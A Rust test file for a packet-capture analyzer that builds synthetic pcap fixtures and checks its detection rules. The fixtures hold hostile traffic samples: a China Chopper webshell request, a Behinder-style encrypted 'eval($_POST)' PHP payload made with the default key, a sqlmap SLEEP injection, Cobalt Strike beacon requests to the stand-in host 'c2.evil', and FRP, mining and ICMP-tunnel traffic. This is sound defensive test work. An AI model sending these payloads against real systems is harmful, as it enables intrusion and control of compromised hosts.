//! Tests and the committed fixture builder for `pcap_offline`. The builders
//! double as the synthetic-capture generator the lab probe uses.

use super::pcap_offline::*;
use std::sync::atomic::AtomicBool;

fn nop(_: u64) {}
static CANCEL: AtomicBool = AtomicBool::new(false);

// ---------------- fixture builders ----------------

pub fn pcap_record(ts_sec: u32, ts_us: u32, payload: &[u8]) -> Vec<u8> {
    let mut r = Vec::new();
    r.extend_from_slice(&ts_sec.to_le_bytes());
    r.extend_from_slice(&ts_us.to_le_bytes());
    r.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    r.extend_from_slice(&(payload.len() as u32).to_le_bytes());
    r.extend_from_slice(payload);
    r
}

pub fn pcap_file(linktype: u32, records: &[Vec<u8>]) -> Vec<u8> {
    let mut f = vec![0xd4, 0xc3, 0xb2, 0xa1, 2, 0, 4, 0];
    f.extend_from_slice(&[0; 8]);
    f.extend_from_slice(&65535u32.to_le_bytes());
    f.extend_from_slice(&linktype.to_le_bytes());
    for r in records {
        f.extend_from_slice(r);
    }
    f
}

pub fn pcapng_file(linktype: u16, packets: &[(u64, &[u8])]) -> Vec<u8> {
    let mut f = vec![
        0x0a, 0x0d, 0x0d, 0x0a, 28, 0, 0, 0, 0x4d, 0x3c, 0x2b, 0x1a, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0,
        0, 0, 28, 0, 0, 0,
    ];
    let mut idb = vec![1, 0, 0, 0, 20, 0, 0, 0];
    idb.extend_from_slice(&linktype.to_le_bytes());
    idb.extend_from_slice(&[0; 2]);
    idb.extend_from_slice(&65535u32.to_le_bytes());
    idb.extend_from_slice(&20u32.to_le_bytes());
    f.extend_from_slice(&idb);
    for (ts_us, pkt) in packets {
        let mut epb2 = Vec::new();
        epb2.extend_from_slice(&0u32.to_le_bytes());
        epb2.extend_from_slice(&((ts_us >> 32) as u32).to_le_bytes());
        epb2.extend_from_slice(&(*ts_us as u32).to_le_bytes());
        epb2.extend_from_slice(&(pkt.len() as u32).to_le_bytes());
        epb2.extend_from_slice(&(pkt.len() as u32).to_le_bytes());
        epb2.extend_from_slice(pkt);
        let pad = (4 - pkt.len() % 4) % 4;
        epb2.extend_from_slice(&vec![0u8; pad]);
        let blen = (epb2.len() + 12) as u32;
        let mut block = vec![6, 0, 0, 0];
        block.extend_from_slice(&blen.to_le_bytes());
        block.extend_from_slice(&epb2);
        block.extend_from_slice(&blen.to_le_bytes());
        f.extend_from_slice(&block);
    }
    f
}

pub fn eth_frame(payload: &[u8], ethertype: u16) -> Vec<u8> {
    let mut f = vec![0u8; 12];
    f.extend_from_slice(&ethertype.to_be_bytes());
    f.extend_from_slice(payload);
    f
}

fn csum16(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    let mut i = 0;
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    !(sum as u16)
}

pub fn ipv4_packet(src: [u8; 4], dst: [u8; 4], proto: u8, l4: &[u8]) -> Vec<u8> {
    let mut p = vec![0x45, 0, 0, 0, 0, 0, 0, 0, 64, proto, 0, 0];
    let total = (20 + l4.len()) as u16;
    p[2..4].copy_from_slice(&total.to_be_bytes());
    p.extend_from_slice(&src);
    p.extend_from_slice(&dst);
    let c = csum16(&p);
    p[10..12].copy_from_slice(&c.to_be_bytes());
    p.extend_from_slice(l4);
    p
}

pub fn tcp_segment(
    src: [u8; 4],
    sport: u16,
    dst: [u8; 4],
    dport: u16,
    seq: u32,
    flags: u8,
    payload: &[u8],
) -> Vec<u8> {
    let mut t = Vec::new();
    t.extend_from_slice(&sport.to_be_bytes());
    t.extend_from_slice(&dport.to_be_bytes());
    t.extend_from_slice(&seq.to_be_bytes());
    t.extend_from_slice(&[0; 4]);
    t.push(0x50);
    t.push(flags);
    t.extend_from_slice(&[0; 6]);
    t.extend_from_slice(payload);
    eth_frame(&ipv4_packet(src, dst, 6, &t), 0x0800)
}

pub fn icmp_echo(
    src: [u8; 4],
    dst: [u8; 4],
    request: bool,
    id: u16,
    seq: u16,
    payload: &[u8],
) -> Vec<u8> {
    let mut p = vec![if request { 8 } else { 0 }, 0, 0, 0];
    p.extend_from_slice(&id.to_be_bytes());
    p.extend_from_slice(&seq.to_be_bytes());
    p.extend_from_slice(payload);
    let c = csum16(&p);
    p[2..4].copy_from_slice(&c.to_be_bytes());
    eth_frame(&ipv4_packet(src, dst, 1, &p), 0x0800)
}

pub fn gzip(bytes: &[u8]) -> Vec<u8> {
    use std::io::Write;
    let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    e.write_all(bytes).unwrap();
    e.finish().unwrap()
}

pub fn aes128_encrypt_ecb(data: &[u8]) -> Vec<u8> {
    use aes::cipher::{BlockEncrypt, KeyInit};
    let key: [u8; 16] = BEHINDER_DEFAULT_KEY.as_bytes().try_into().unwrap();
    let cipher = aes::Aes128::new((&key).into());
    data.chunks(16)
        .flat_map(|c| {
            let mut b = [0u8; 16];
            b[..c.len()].copy_from_slice(c);
            let mut block = aes::Block::from(b);
            cipher.encrypt_block(&mut block);
            block.to_vec()
        })
        .collect()
}

const A: [u8; 4] = [10, 0, 0, 1];
const B: [u8; 4] = [10, 0, 0, 2];

fn http_exchange_pcap() -> Vec<u8> {
    let body = gzip(b"hello caidao world");
    let req = b"GET /index.html HTTP/1.1\r\nHost: example.test\r\n\r\n".to_vec();
    // chunked + gzip: keep the compressed bytes binary — never via String.
    let mut resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Encoding: gzip\r\nTransfer-Encoding: chunked\r\n\r\n".to_vec();
    resp.extend_from_slice(format!("{:x}\r\n", body.len()).as_bytes());
    resp.extend_from_slice(&body);
    resp.extend_from_slice(b"\r\n0\r\n\r\n");
    pcap_file(
        1,
        &[
            pcap_record(1000, 0, &tcp_segment(A, 40000, B, 80, 1000, 0x18, &req)),
            pcap_record(
                1000,
                500_000,
                &tcp_segment(B, 80, A, 40000, 5000, 0x18, &resp),
            ),
        ],
    )
}

#[test]
fn http_gzip_chunked_roundtrip() {
    let a = analyze_pcap(&http_exchange_pcap(), &nop, &CANCEL).unwrap();
    assert_eq!(a.http.len(), 1);
    let tx = &a.http[0];
    assert_eq!(tx.method, "GET");
    assert_eq!(tx.uri, "/index.html");
    assert_eq!(tx.status, 200);
    let obj = &a.objects[0];
    assert_eq!(obj.content_type, "text/html");
    assert_eq!(a.object_bytes[&obj.id], b"hello caidao world");
}

#[test]
fn tcp_reassembly_orders_dedupes_and_delivers() {
    let d1 = b"GET /a HTTP/1.1\r\nHost: h\r\n\r\n".to_vec();
    let d2 = b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok".to_vec();
    let recs = vec![
        pcap_record(1, 0, &tcp_segment(A, 1000, B, 80, 1010, 0x18, &d1[10..])),
        pcap_record(1, 1, &tcp_segment(A, 1000, B, 80, 1010, 0x18, &d1[10..])),
        pcap_record(1, 2, &tcp_segment(A, 1000, B, 80, 1000, 0x18, &d1[..10])),
        pcap_record(1, 3, &tcp_segment(B, 80, A, 1000, 900, 0x18, &d2)),
    ];
    let a = analyze_pcap(&pcap_file(1, &recs), &nop, &CANCEL).unwrap();
    assert_eq!(a.http.len(), 1);
    assert_eq!(a.http[0].status, 200);
}

#[test]
fn caidao_echo_and_params_flagged() {
    let req = b"POST /shell.php HTTP/1.1\r\nHost: h\r\nContent-Length: 20\r\n\r\nz0=AAAA&z1=BBBB";
    let resp = b"HTTP/1.1 200 OK\r\nContent-Length: 30\r\n\r\nX@Ysecret-outputX@Y pad pad";
    let f = pcap_file(
        1,
        &[
            pcap_record(1, 0, &tcp_segment(A, 1000, B, 80, 10, 0x18, req)),
            pcap_record(1, 1, &tcp_segment(B, 80, A, 1000, 20, 0x18, resp)),
        ],
    );
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert!(a.alerts.iter().any(|x| x.rule == "caidao"));
    assert!(a.echoes.iter().any(|e| e.text == "secret-output"));
}

#[test]
fn behinder_default_key_decryption_is_strong() {
    let plain = b"@error_reporting(0);session_start();eval($_POST['x']);   ";
    let blob = aes128_encrypt_ecb(plain);
    let mut body =
        format!("POST /x.jsp HTTP/1.1\r\nHost: h\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n", blob.len())
            .into_bytes();
    body.extend_from_slice(&blob);
    let f = pcap_file(
        1,
        &[pcap_record(
            1,
            0,
            &tcp_segment(A, 1000, B, 80, 10, 0x18, &body),
        )],
    );
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert!(
        a.alerts
            .iter()
            .any(|x| x.rule == "behinder" && x.level == "strong"),
        "{:?}",
        a.alerts
    );
}

#[test]
fn plain_get_gets_no_signatures() {
    let a = analyze_pcap(&http_exchange_pcap(), &nop, &CANCEL).unwrap();
    assert!(a.alerts.is_empty(), "{:?}", a.alerts);
}

#[test]
fn sqlmap_ua_and_payload_flags() {
    let req = b"GET /q?id=1%20AND%20SLEEP(5) HTTP/1.1\r\nHost: h\r\nUser-Agent: sqlmap/1.7\r\n\r\n";
    let f = pcap_file(
        1,
        &[pcap_record(
            1,
            0,
            &tcp_segment(A, 1000, B, 80, 10, 0x18, req),
        )],
    );
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert!(
        a.alerts
            .iter()
            .any(|x| x.rule == "sqlmap" && x.level == "strong")
    );
}

#[test]
fn cs_beacon_periodic_with_default_uri() {
    let mut recs = Vec::new();
    for i in 0..6u32 {
        let req = b"GET /submit.php HTTP/1.1\r\nHost: c2.evil\r\nCookie: aGVsbG93b3JsZHBhZGRpbmc=\r\n\r\n";
        recs.push(pcap_record(
            1000 + i * 60,
            i * 500,
            &tcp_segment(A, 1000, B, 443, 10 + i * 100, 0x18, req),
        ));
    }
    let a = analyze_pcap(&pcap_file(1, &recs), &nop, &CANCEL).unwrap();
    assert!(
        a.alerts
            .iter()
            .any(|x| x.rule == "cs-beacon" && x.level == "strong"),
        "{:?}",
        a.alerts
    );
}

#[test]
fn non_periodic_requests_do_not_flag_cs() {
    let mut recs = Vec::new();
    for (i, t) in [0u32, 1, 30, 900, 4000, 9200].iter().enumerate() {
        let req = format!("GET /page{} HTTP/1.1\r\nHost: c2.evil\r\n\r\n", i).into_bytes();
        recs.push(pcap_record(
            1000 + t,
            0,
            &tcp_segment(A, 1000, B, 443, 10 + i as u32 * 100, 0x18, &req),
        ));
    }
    let a = analyze_pcap(&pcap_file(1, &recs), &nop, &CANCEL).unwrap();
    assert!(
        !a.alerts.iter().any(|x| x.rule == "cs-beacon"),
        "{:?}",
        a.alerts
    );
}

#[test]
fn frp_login_and_stratum_flagged() {
    let frp = br#"{"type":"login","version":"0.51.0","hostname":"w1","privilege_key":"k","run_id":"r","pool_count":2}"#.to_vec();
    let stratum = br#"{"id":1,"jsonrpc":"2.0","method":"mining.subscribe","params":[]}"#.to_vec();
    let f = pcap_file(
        1,
        &[
            pcap_record(1, 0, &tcp_segment(A, 5000, B, 7000, 10, 0x18, &frp)),
            pcap_record(2, 0, &tcp_segment(A, 6000, B, 3333, 10, 0x18, &stratum)),
        ],
    );
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert!(a.alerts.iter().any(|x| x.rule == "frp"));
    assert!(a.alerts.iter().any(|x| x.rule == "stratum"));
}

#[test]
fn icmp_tunnel_varied_large_payloads() {
    let mut recs = Vec::new();
    for i in 0..6u16 {
        let payload: Vec<u8> = (0..80u16).map(|b| (b * 31 + i * 7) as u8).collect();
        recs.push(pcap_record(
            1,
            i as u32,
            &icmp_echo(A, B, true, 1, i, &payload),
        ));
    }
    let a = analyze_pcap(&pcap_file(1, &recs), &nop, &CANCEL).unwrap();
    assert!(
        a.alerts.iter().any(|x| x.rule == "icmp-tunnel"),
        "{:?}",
        a.alerts
    );
}

#[test]
fn pcapng_epb_roundtrip() {
    let pkt = tcp_segment(
        A,
        1000,
        B,
        80,
        10,
        0x18,
        b"GET / HTTP/1.1\r\nHost: h\r\n\r\n",
    );
    let f = pcapng_file(1, &[(1_000_000, &pkt)]);
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert_eq!(a.summary.format, "pcapng");
    assert_eq!(a.http.len(), 1);
}

#[test]
fn fuzz_random_and_truncation_never_panics() {
    let fixture = http_exchange_pcap();
    for len in 0..fixture.len().min(400) {
        let _ = analyze_pcap(&fixture[..len], &nop, &CANCEL);
    }
    let mut state = 0x9e3779b97f4a7c15u64;
    let mut rng = move || {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        state
    };
    for _ in 0..200 {
        let len = (rng() % 4096) as usize;
        let mut buf = vec![0u8; len];
        for b in &mut buf {
            *b = rng() as u8;
        }
        if len > 24 && rng() % 3 == 0 {
            buf[..24].copy_from_slice(&pcap_file(1, &[])[..24]);
        }
        let _ = analyze_pcap(&buf, &nop, &CANCEL);
    }
}

#[test]
fn fragment_is_counted_as_gap() {
    let mut ip = ipv4_packet(A, B, 6, &[0u8; 20]);
    ip[6] = 0x20;
    let f = pcap_file(1, &[pcap_record(1, 0, &eth_frame(&ip, 0x0800))]);
    let a = analyze_pcap(&f, &nop, &CANCEL).unwrap();
    assert_eq!(a.summary.fragment_count, 1);
}

#[test]
fn backend_style_fixture_smoke() {
    let req = b"POST /up.php HTTP/1.1\r\nHost: 10.0.0.5\r\nContent-Type: application/octet-stream\r\nContent-Length: 4\r\n\r\nABCD";
    let resp = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: 5\r\n\r\nHELLO";
    let p1 = tcp_segment([10, 0, 0, 1], 40000, [10, 0, 0, 5], 80, 1000, 0x18, req);
    let p2 = tcp_segment([10, 0, 0, 5], 80, [10, 0, 0, 1], 40000, 5000, 0x18, resp);
    let data = pcap_file(
        1,
        &[
            pcap_record(1_700_000_000, 0, &p1),
            pcap_record(1_700_000_001, 0, &p2),
        ],
    );
    let a = analyze_pcap(&data, &nop, &CANCEL).unwrap();
    eprintln!("objects={} http={}", a.objects.len(), a.http.len());
    assert!(!a.objects.is_empty());
}

/// Real captures carry the handshake. A bare SYN marks the opener, but a
/// SYN+ACK carries the same SYN bit — treated as the opener it flips the
/// "client" direction onto the server side and HTTP never parses. Regression
/// for exactly that.
#[test]
fn http_parses_with_full_handshake() {
    let syn = tcp_segment([10, 0, 0, 1], 40000, [10, 0, 0, 5], 80, 999, 0x02, b"");
    let synack = tcp_segment([10, 0, 0, 5], 80, [10, 0, 0, 1], 40000, 4999, 0x12, b"");
    let ack = tcp_segment([10, 0, 0, 1], 40000, [10, 0, 0, 5], 80, 1000, 0x10, b"");
    let req = tcp_segment(
        [10, 0, 0, 1],
        40000,
        [10, 0, 0, 5],
        80,
        1000,
        0x18,
        b"GET /index.html HTTP/1.1\r\nHost: 10.0.0.5\r\n\r\n",
    );
    let resp = tcp_segment(
        [10, 0, 0, 5],
        80,
        [10, 0, 0, 1],
        40000,
        5000,
        0x18,
        b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi",
    );
    let data = pcap_file(
        1,
        &[
            pcap_record(1_700_000_000, 0, &syn),
            pcap_record(1_700_000_000, 1, &synack),
            pcap_record(1_700_000_000, 2, &ack),
            pcap_record(1_700_000_000, 3, &req),
            pcap_record(1_700_000_000, 4, &resp),
        ],
    );
    let a = analyze_pcap(&data, &nop, &CANCEL).unwrap();
    assert_eq!(a.http.len(), 1, "handshake must not hide HTTP");
    assert_eq!(a.http[0].uri, "/index.html");
    assert_eq!(a.http[0].status, 200);
}
